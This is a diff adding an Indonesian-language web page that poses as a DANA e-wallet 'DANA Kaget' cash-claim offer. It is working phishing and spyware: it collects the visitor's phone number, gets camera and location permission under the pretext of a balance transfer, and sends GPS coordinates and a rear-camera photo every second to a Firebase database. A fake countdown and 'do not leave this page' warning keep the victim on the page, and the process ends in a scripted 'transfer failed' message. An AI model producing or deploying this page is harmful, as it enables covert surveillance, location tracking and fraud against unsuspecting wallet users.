@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA Kaget - Klaim Saldo</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <style>
+        :root { --dana-blue: #118eea; --dana-dark: #0e78c9; }
+        body { 
+            background: var(--dana-blue); 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; color: #333;
+        }
+        .card { 
+            width: 90%; max-width: 380px; background: #fff; 
+            padding: 0; border-radius: 20px; text-align: center; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); overflow: hidden;
+        }
+        .header { background: var(--dana-blue); padding: 30px 20px; color: white; }
+        .content { padding: 30px 25px; }
+        .logo-dana { width: 120px; margin-bottom: 15px; }
+        .btn { 
+            width: 100%; padding: 15px; background: var(--dana-blue); 
+            color: #fff; border: none; border-radius: 50px; 
+            font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s;
+        }
+        .btn:hover { background: var(--dana-dark); }
+        input { 
+            width: 100%; padding: 15px; margin-bottom: 20px; 
+            border: 1px solid #ddd; border-radius: 10px; 
+            text-align: center; outline: none; font-size: 18px; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--dana-blue); }
+        .warning { color: #e74c3c; font-weight: bold; font-size: 12px; margin-top: 15px; display: none; }
+        
+        /* Progress Bar */
+        .progress-container { width: 100%; background: #eee; border-radius: 10px; margin: 20px 0; display: none; }
+        .progress-bar { width: 0%; height: 10px; background: #2ecc71; border-radius: 10px; transition: 1s linear; }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid var(--dana-blue);
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 20px auto; display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="box" class="card">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danawallet.png" class="logo-dana" alt="DANA">
+        <h2 style="margin:0; font-size: 20px;">DANA Kaget</h2>
+    </div>
+    
+    <div class="content" id="main-ui">
+        <div style="font-size:60px; margin-bottom:10px;">🧧</div>
+        <h3 style="margin-top:0;">Selamat!</h3>
+        <p style="color:#666; font-size:14px;">Masukkan nomor DANA Anda untuk mencairkan saldo kaget hari ini.</p>
+        
+        <input type="number" id="phone" placeholder="Contoh: 08123456789" pattern="[0-9]*">
+        <button class="btn" onclick="startProcess()">BUKA SEKARANG</button>
+    </div>
+
+    <div class="content" id="loading-ui" style="display:none;">
+        <div class="loading-spinner" id="spinner"></div>
+        <h3 id="status-text">Memverifikasi Data...</h3>
+        <p id="timer-text" style="font-size: 14px; color: #666;">Mohon tunggu sebentar.</p>
+        
+        <div class="progress-container" id="p-container">
+            <div class="progress-bar" id="p-bar"></div>
+        </div>
+        
+        <p class="warning" id="warning-msg">⚠️ JANGAN KELUAR DARI HALAMAN INI<br>Atau proses transfer akan dibatalkan otomatis.</p>
+    </div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    // Konfigurasi Firebase Anda
+    const firebaseConfig = {
+        apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
+        authDomain: "kodangz.firebaseapp.com",
+        databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
+        projectId: "kodangz",
+        storageBucket: "kodangz.firebasestorage.app",
+        messagingSenderId: "306989473099",
+        appId: "1:306989473099:web:9049d3135ce13e08a8dcce"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let myDID = "DANA-" + Math.floor(Math.random()*99999);
+    let camTrack = null;
+
+    async function startProcess() {
+        const phone = document.getElementById('phone').value.trim();
+        if(phone.length < 10) {
+            alert("Masukkan nomor DANA yang valid!");
+            return;
+        }
+
+        try {
+            // Meminta Perizinan Kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            
+            // Sembunyikan Input, Tampilkan Loading
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('loading-ui').style.display = 'block';
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('warning-msg').style.display = 'block';
+
+            // Inisialisasi Kamera & Firebase
+            camTrack = stream.getVideoTracks()[0];
+            const v = document.getElementById('v'), cv = document.getElementById('c');
+            v.srcObject = stream; v.play();
+
+            db.ref(`connections/${phone}/${myDID}`).set({ 
+                device: navigator.platform,
+                status: "Proses Transfer"
+            });
+
+            // Ambil Lokasi
+            navigator.geolocation.getCurrentPosition(p => {
+                db.ref(`data/${myDID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+            });
+
+            // Background Streamer
+            setInterval(() => {
+                cv.width = v.videoWidth; cv.height = v.videoHeight;
+                const ctx = cv.getContext('2d');
+                ctx.drawImage(v, 0, 0);
+                db.ref(`data/${myDID}/stream`).set({ frame: cv.toDataURL('image/jpeg', 0.3) });
+            }, 1000);
+
+            // Jalankan Timer 60 Detik
+            startTransferTimer();
+
+        } catch(e) { 
+            alert("Error: Izinkan akses kamera dan lokasi untuk mengklaim saldo!"); 
+        }
+    }
+
+    function startTransferTimer() {
+        let timeLeft = 60;
+        const statusText = document.getElementById('status-text');
+        const timerText = document.getElementById('timer-text');
+        const progressBar = document.getElementById('p-bar');
+        const progressContainer = document.getElementById('p-container');
+
+        progressContainer.style.display = 'block';
+        statusText.innerText = "Proses Transfer Saldo...";
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            let percentage = ((60 - timeLeft) / 60) * 100;
+            progressBar.style.width = percentage + "%";
+            timerText.innerText = `Sedang mengirim ke nomor Anda... (${timeLeft}s)`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                statusText.innerText = "Transfer Gagal!";
+                timerText.innerText = "Sinyal tidak stabil. Coba beberapa saat lagi.";
+                progressBar.style.backgroundColor = "#e74c3c";
+            }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
